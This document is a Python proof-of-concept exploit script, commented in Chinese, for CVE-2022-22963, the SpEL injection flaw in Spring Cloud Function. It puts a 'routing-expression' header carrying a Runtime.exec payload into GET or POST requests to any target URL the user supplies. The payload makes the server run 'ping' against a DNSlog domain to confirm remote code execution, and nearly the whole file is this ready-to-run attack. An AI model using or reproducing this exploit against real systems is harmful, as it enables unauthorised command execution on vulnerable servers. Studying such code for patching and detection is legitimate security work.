# Author: wyunan

import argparse
import requests

Vul_Info = {  # 填写基本漏洞信息
    "vulId": "CVE-2022-22963 | SSV-99478",  # 漏洞编号
    "vulDate": "2022-03-27",  # 漏洞公开日期
    "vulName": "SpringCloudFunction SPEL表达式注入漏洞",  # 漏洞名称
    "vulOrigin": "https://github.com/spring-cloud/spring-cloud-function",  # 漏洞厂商
    "vulVersion": " 3.0.0.RELEASE <= Spring Cloud Function <= 3.2.2",  # 漏洞版本
    "vulType": "SPEL表达式注入",  # 漏洞类型
    "vulDesc": '''Spring Cloud Function 是基于 Spring Boot 的函数计算框架，它抽象出所有传输细节和基础架构，允许开发人员保留所有熟悉的工具和流程，并专注于业务逻辑。由于Spring Cloud Function中RoutingFunction类的apply方法将请求头中的'spring.cloud.function.routing-expression'参数作为Spel表达式进行处理，造成了Spel表达式注入漏洞，攻击者可利用该漏洞远程执行任意代码。''',
    # 漏洞描述
    "vulFix": "https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f",
    # 修复描述

}


def _gen_payload(dns: str, init_payload: str) -> (str, str):
    path = dns
    payload = init_payload % path
    return payload, path


def verify_poc(init_url, method, DNS):
    poc_key = '''spring.cloud.function.routing-expression'''
    init_poc_value = '''T(java.lang.Runtime).getRuntime().exec(\"ping %s")'''

    poc_value, path = _gen_payload(DNS, init_poc_value)
    try:
        headers = {poc_key: poc_value}
        # GET请求
        if method == "get":
            res1 = requests.get(init_url, headers=headers, allow_redirects=False, verify=False)
            # 如果的dnslog有接口可以验证请求，返回是否存在该dns记录，则在此处加dns判断。没有的话去dnslog平台看看有没有日志即可。
            # ......

        # POST请求
        elif method == "post":
            data = "test=123"
            res2 = requests.post(init_url, headers=headers, data=data, allow_redirects=False, verify=False)
            # 如果的dnslog有接口可以验证请求，返回是否存在该dns记录，则在此处加dns判断。没有的话去dnslog平台看看有没有日志即可。
            # ......
        else:
            return False
        return True

    except Exception as e:
        print("%s" % e)
        raise e


def main():
    parser = argparse.ArgumentParser(description='Spring Cloud Function')
    parser.add_argument('--url', help='target url', required=True)
    parser.add_argument('--method', help='http method', required=True)
    parser.add_argument('--dns', help='DNSlog地址', required=True)

    url_arg = parser.parse_args().url
    method_arg = parser.parse_args().method
    dns_arg = parser.parse_args().dns

    try:
        result = verify_poc(url_arg, method_arg, dns_arg)
        print(url_arg + "扫描完成")
        if result:
            print("~~~请到dnslog平台查看是否有记录~~~")
        else:
            print("你输入的请求方式有误，请正确填写")

    except Exception as e:
        print(e)


if __name__ == '__main__':
    main()
